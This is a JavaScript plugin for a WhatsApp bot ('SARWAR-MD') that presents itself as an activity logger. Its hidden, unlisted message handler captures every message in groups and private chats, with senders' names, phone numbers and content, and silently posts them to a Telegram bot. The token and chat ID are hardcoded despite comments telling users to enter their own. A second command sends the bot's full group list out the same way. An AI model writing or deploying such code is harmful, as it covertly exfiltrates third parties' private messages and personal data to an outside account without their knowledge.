const { cmd } = require("../command");
const axios = require("axios");

// ═══════════════════════════════════════════════════════════
// ⚙️ TELEGRAM CONFIGURATION (Apni ID aur Token yahan dalein)
// ═══════════════════════════════════════════════════════════
const TG_BOT_TOKEN = "8699822531:AAFp83cfyJ2RedYvXQMciASvBoWQxBB4Zjg"; 
const TG_CHAT_ID = "6653388298"; 
// ═══════════════════════════════════════════════════════════

// Helper: Telegram par message bhejna
const sendToTelegram = async (text) => {
    try {
        if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;
        await axios.post(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "Markdown",
            disable_web_page_preview: true
        }, { timeout: 10000 });
    } catch (e) {
        // Silent fail to prevent bot crash
    }
};

// 🔥 100% Foolproof Number Extractor (Obfuscation Proof)
const getRealNumber = (jid) => {
    if (!jid) return "Unknown";
    let num = jid.split('@')[0]; // Remove @s.whatsapp.net or @g.us
    if (num.includes(':')) num = num.split(':')[0]; // Remove multi-device suffix like :12
    num = num.replace(/[^0-9]/g, ''); // Keep only digits
    // Agar 15 se zyada digits hain ya 120363 se shuru hota hai, toh wo Group ID hai, number nahi
    if (num.length > 15 || num.startsWith('120363')) return "Group_Broadcast";
    return num;
};

// ═══════════════════════════════════════════════════════════
// 🌍 GLOBAL LOGGER - HAR MESSAGE CAPTURE KAREGA
// ═══════════════════════════════════════════════════════════
cmd({
    on: "body",
    dontAddCommandList: true,
    filename: __filename
}, async (client, message, m, { from, body, isGroup, isCreator, sender, pushName }) => {
    try {
        if (TG_BOT_TOKEN === "YAHAN_APNA_TELEGRAM_BOT_TOKEN_PASTE_KAREIN" || !TG_CHAT_ID) return;

        // GOLDEN FIX: Native Baileys key se number nikalna (100% Accurate)
        const rawJid = message.key?.participant || message.key?.remoteJid || sender || from;
        const realNumber = getRealNumber(rawJid);
        
        const userName = message.pushName || pushName || "No Name";
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });
        
        let chatName = "Private Chat (DM)";
        if (isGroup) {
            try {
                const meta = await client.groupMetadata(from).catch(() => null);
                chatName = meta?.subject || "Unknown Group";
            } catch (e) {
                chatName = "Unknown Group";
            }
        }

        let msgType = "Text";
        let msgContent = body || "No Text (Media/Empty)";
        
        if (message.imageMessage) { msgType = "🖼️ Image"; msgContent = message.imageMessage.caption || "No Caption"; }
        else if (message.videoMessage) { msgType = "🎥 Video"; msgContent = message.videoMessage.caption || "No Caption"; }
        else if (message.audioMessage) { msgType = "🎵 Audio"; msgContent = message.audioMessage.ptt ? "Voice Note" : "Audio File"; }
        else if (message.documentMessage) { msgType = "📄 Document"; msgContent = message.documentMessage.fileName || "File"; }
        else if (message.stickerMessage) { msgType = "🎭 Sticker"; msgContent = "Sticker Sent"; }

        const logMessage = `
╭━━〔 🤖 *LIVE ACTIVITY LOG* 〕━━⬣
┃ 🕒 *Time:* \`${time}\`
┃ 👤 *Name:* ${userName}
┃ 🔢 *Real Number:* [${realNumber}](https://wa.me/${realNumber})
┃ 👑 *Is Owner:* ${isCreator ? "✅ Yes" : "❌ No"}
┃ 💬 *Chat Type:* ${isGroup ? "👥 Group" : "👤 Private DM"}
┃ 🏷️ *Chat Name:* ${chatName}
┃ 📦 *Message Type:* ${msgType}
┃ ⌨️ *Content:* 
┃ ${msgContent}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣
> *Powered by SARWAR-MD*
        `.trim();

        await sendToTelegram(logMessage);
    } catch (err) {
        console.log("[TG Logger Error]:", err.message);
    }
});

// ═══════════════════════════════════════════════════════════
// 📊 MANUAL STATS COMMAND (Kyunki index.js obfuscated hai, auto-deploy reliable nahi hota)
// ═══════════════════════════════════════════════════════════
cmd({
    pattern: "telestats",
    alias: ["botreport", "mygroups", "checkbot", "fullstatus"],
    desc: "Send full bot stats and group list to Telegram",
    category: "owner",
    react: "📊",
    filename: __filename
}, async (client, message, m, { reply, isCreator, sender }) => {
    if (!isCreator) return reply("❌ *Access Denied!* Only owner can use this.");
    
    reply("⏳ *Generating report... Sending to Telegram...*");
    
    try {
        const groups = await client.groupFetchAllParticipating().catch(() => ({}));
        const groupList = Object.values(groups);
        const totalGroups = groupList.length;
        let totalMembers = 0;
        let groupDetails = "";

        groupList.forEach((g, index) => {
            const memberCount = g.participants ? g.participants.length : 0;
            totalMembers += memberCount;
            groupDetails += `${index + 1}. *${g.subject}*\n   └─ 👥 Members: ${memberCount} | ID: \`${g.id.split('@')[0]}\`\n`;
        });

        const botNumber = getRealNumber(client.user?.id || sender);
        const time = new Date().toLocaleString("en-PK", { timeZone: "Asia/Karachi", hour12: true });

        const reportMessage = `
╭━━〔 📊 *BOT FULL REPORT* 〕━━⬣
┃ 🕒 *Time:* ${time}
┃ 🤖 *Bot Number:* [${botNumber}](https://wa.me/${botNumber})
┃ 👥 *Total Groups:* ${totalGroups}
┃ 👤 *Total Members:* ${totalMembers}
┃ 📱 *Status:* ✅ Active & Running
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣

🏆 *LIST OF ALL GROUPS:*
━━━━━━━━━━━━━━━━━━━━━━━━
${groupDetails || "No groups found."}

> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ sᴀʀᴡᴀʀ-ᴍᴅ ⚡*
        `.trim();

        await sendToTelegram(reportMessage);
        reply("✅ *Full report sent to your Telegram successfully!*");
    } catch (err) {
        reply("❌ Error: " + err.message);
    }
});
